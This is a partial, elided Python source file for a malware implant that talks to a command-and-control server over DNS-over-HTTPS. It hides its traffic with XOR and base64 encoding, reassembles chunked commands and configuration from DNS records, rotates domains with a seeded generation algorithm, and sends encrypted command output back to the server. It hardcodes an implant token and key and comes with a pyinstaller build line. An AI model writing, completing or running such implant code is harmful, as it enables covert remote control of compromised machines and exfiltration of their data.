# pyinstaller --onefile DOH_XOR.py
...
def xor_encrypt_decrypt_string(data, key):
    if isinstance(data, str):
        data = data.encode("utf-8")
    encrypted_bytes2 = bytes([b ^ key for b in data])
    return b64encode(encrypted_bytes2).decode("utf-8")

def xor_decrypt_base64_string(data, key):
    decrypted_bytes2 = b64decode(data)
    decrypted = bytes([b ^ key for b in decrypted_bytes2])
    return decrypted.decode("utf-8", errors="replace")

class DOH_Client:
    def __init__(self, server_url, id_token, xor_key, user_agent=None, uris=None, dga_timer=300):
    ...
    def is_spoof_txt(self, txt):
        txt_lower = txt.lower()
        if any(txt_lower.startswith(p) for p in ["i=", "cb:", "cmd_info:", "cmd_complete:", "dga=", "cfg:"]):
            return False
    ...
    def parse_init_payload(self, txt):
        try:
            ...
            if 's' in params:
                self.shadow_a_record = params['s']
            if 'p' in params:
                self.pivot_a_record = params['p']
            if 'sl' in params:
    ...
    def parse_config_part(self, txt):
        try:
            ...
            if cfg_data['received_count'] == cfg_data['total']:
                full_encrypted_text = ''.join(cfg_data['parts'])
                
                try:
                    decrypted_config = xor_decrypt_base64_string(full_encrypted_text, self.xor_key)
                except Exception:
                    del self.config_parts[checksum]
                    return False
                
                calculated = hashlib.sha256(decrypted_config.encode('utf-8')).hexdigest()[:8]
        ...
        try:
            ...
            if checksum in self.command_parts:
                ...
                if cmd_data['received_count'] == cmd_data['total']:
                    full_encrypted = ''.join(cmd_data['parts'])

                    try:
                        full_command = xor_decrypt_base64_string(full_encrypted, self.xor_key)
                ...
                if rrset.rdtype == dns.rdatatype.A:
                    ...
                    for rd in rrset:
                        ...
                        if txt.startswith("ENC:"):
                            encrypted_data = txt[4:]
                            try:
                                decrypted_txt = xor_decrypt_base64_string(encrypted_data, self.xor_key)
                            except:
                                decrypted_txt = txt
                        else:
                            decrypted_txt = txt
                            
                        if decrypted_txt.startswith("i="):
                            self.parse_init_payload(decrypted_txt)
                        elif decrypted_txt.startswith("dga="):
                            parts = decrypted_txt[4:].strip().split('|')
                            new_domain = parts[0]
                            if len(parts) > 1 and parts[1].startswith("seed="):
                                new_seed = parts[1][5:]
                                self.implant_seed = new_seed
                        elif decrypted_txt.startswith("cb:"):
                            self.parse_command_part(decrypted_txt)
                        elif decrypted_txt.startswith("cfg:"):
                            self.parse_config_part(decrypted_txt)
                        elif decrypted_txt.startswith("cmd_info:"):
                            self.parse_cmd_info(decrypted_txt)
                        elif decrypted_txt.startswith("cmd_complete:"):
                            cmd = self.check_command_complete(decrypted_txt)
                            if cmd:
    ...
    def send_output(self, output):
        ...
        try:
            encrypted_output = xor_encrypt_decrypt_string(output, self.xor_key)
...
if __name__ == "__main__":
    ...
    id_token = "2f0e6af0-578b-4939-92f3-9666e81bb37b"
    xor_key = 11
    
    client = DOH_Client(server_url, id_token, xor_key, dga_timer=5)
    client.run()